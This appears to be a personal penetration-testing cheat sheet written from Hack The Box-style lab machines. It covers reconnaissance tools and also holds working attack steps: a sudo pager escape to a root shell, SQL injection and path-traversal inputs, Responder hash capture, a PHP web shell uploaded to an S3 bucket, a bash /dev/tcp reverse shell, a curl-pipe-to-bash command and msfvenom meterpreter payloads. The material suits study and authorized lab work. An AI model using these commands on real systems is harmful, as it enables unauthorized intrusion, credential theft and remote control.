# Pen-testing
Pen-testing tips and tools

### sudo

sudo -l    → get all commands that can be run as sudo

can be exploited with less:

```nasm
sudo /usr/bin/systemctl status trail.service
sudo /usr/bin/systemctl status trail.service
WARNING: terminal is not fully functional
-  (press RETURN)!/bin/bash
!//bbiinn//bbaasshh!/bin/bash
```

### nmap

Network mapper, check for open ports with service/version

nmap -sV {ip}  → Probe open ports

nmap -p-     → check ALL ports

nmap -O     → OS detection

### telnet

telnet {ip}

connect to server with telnet

### ftp

ftp {ip}

connect with ftp to server

username: anonymous → connect without account

### smbclient

used to connect to windows environments over SMB/CIFS 

smbclient //IPADDRESS

smbclient -L //IPADDRESS → list all available shares

smbclient //IPADDRESS/share → connect to share docs

then navigate in a shell

### redis-cli

used to connect to redis database

redis-cli -h {ip} -p {port}     → remote access

SELECT 0    → select index database

DBSIZE  → size of db

KEYS *   → show all keys

GET {key}  →  show content of the key

### dirb

tool for scanning http pages

dirb {url} /usr/share/wordlist

dirb -X {extension}     →   .php .html  …

### sql injection

access to sql database through unsanitize input

admin’#    → comment rest of line

### mysql

connect to sql database

mysql -h {ip} -u {user}    → with root can have all priv

MARIADB:

SHOW database;

USE database;

SELECT * FROM {table};

### file inclusion vulnerability

when a file is include() in a php script in an URL and not sanitized, ex:                                               http://url:80/index.php?page=french.html

this can be exploited by giving paths

page=../../../../../../../../windows/system32/drivers/etc/hosts

### responder

Responder an LLMNR, NBT-NS and MDNS poisoner. LLMNR, NBT-NS, and MDNS poisoner techniques involve intercepting and responding to network name resolution requests in order to redirect or manipulate network traffic

LLMNR (Link-Local Multicast Name Resolution)

NBT-NS (NetBIOS Name Service)

MDNS (Multicast DNS)

sudo responder -I tun0

launch the server and listen, then with a FIV, include the ip address of the server:

http://unika.htb/index.php?page=//10.10.15.133/whatever

You are able to get the hash + user of the site

[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER

then try to break the hash → john

### john

hash resolver

john hash.txt → find the hash algo and might resolve it

john -w=/usr/share/wordlist hash.txt  → add a wordlist to try to break the hash

rockyou.txt  → biggest leak of common passwords

### evil-winrm

exploit and control windows machines remotely

evil-winrm -i {ip} -u {user} -p {password}

connect ssh-like to the machine

strong with administrator connection

### wappanalizer

firefox extension to analyze website technology stack used

### gobuster

fuzzer tool to find domains and dir of url with wordlists

gobuster vhost → subdomain find

gobuster vhost -u {domain} -w {wordlist} —append-domain   →  

GoBuster will send out requests with a host header that looks like the following for each word in the wordlist:  {word}.{domain}

### Nc

to listen for a reverse shell :

nc -lvnp {port}

### awscli

awscli is used to interact with aws servers/domains/buckets

aws —endpoint={url} {type} {command}

execute command to the endpoint

└─$ aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb   → list all files

we can also upload files to the bucket (script)   → 

echo '<?php system($_GET["cmd"]); ?>' > shell.php

aws --endpoint={url} s3 cp shell.php s3://thetoppers.htb

### Reverse shell in awss3

if a aws bucket is found and we can copy file inside s3 type

aws configure  → enter arbitary value, need to be configured

aws —endpoint={bucketUrl} {type} ls

create a php script to exec commands:

echo '<?php system($_GET["cmd"]); ?>' > shell.php

command injection at:

{url}/shell.php?cmd={cmd}

upload the script:

aws —endpoint={url} {type} cp shell.php {type}://url

get our ip address with ifconfig and create a reverse shell script:

```bash
#!/bin/bash
bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1
```

listen with nc on our machine:  listen verbose [localhost](http://localhost) port

```bash
nc -nvlp 1337
```

`then lauch a web server on our machine:

```bash
python3 -m http.server 8000
```

then visit the url:

```bash
{url}/shell.php?cmd=curl%20<IPADDRESS>:8000/shell.sh|bash
```

It will then spawn a reverse shell on our netcat listening

```bash
┌──(amuller㉿Laptop)-[/var/www]
└─$ nc -nvlp 1337             
listening on [any] 1337 ...
connect to [10.10.15.133] from (UNKNOWN) [10.129.102.185] 52814
bash: cannot set terminal process group (1382): Inappropriate ioctl for device
bash: no job control in this shell
www-data@three:/var/www/html$ cd ..
cd ..
```

### Metaxploit

setup of a reverse tcp shell on windows ms-sql:

in msfvenom:

msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} -f exe -o payload.exe

in msf6:

use exploit/multi/handler

set payload /windows/meterpreter/reverse_tcp

show options

setg LHOST {ip}

run

### Burpsuite

track all network and proxy

add FoxyProxy extension :

http 127.0.0.1 8080

In burp you get all traffic to/from your target, and with repeater, can change the request

### Developer mode

Inspect → storage → cookie  = can modify the current cookies

### wfuzz

http request fuzzer

can specify wordlist and use FUZZ identifier to replace and try to get responses

wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/test.txt --hc 404 http://10.10.11.224:55555/FUZZ

-z for worldist, don’t forget the file,

—hc 404  ignore 404

-c colors

wfuzz -c -z file,/usr/share/wfuzz/wordlist/injection/SQL.txt -d “username=1&password=FUZZ” --hc 404 http://10.10.11.224:55555/FUZZ

-d params to the request
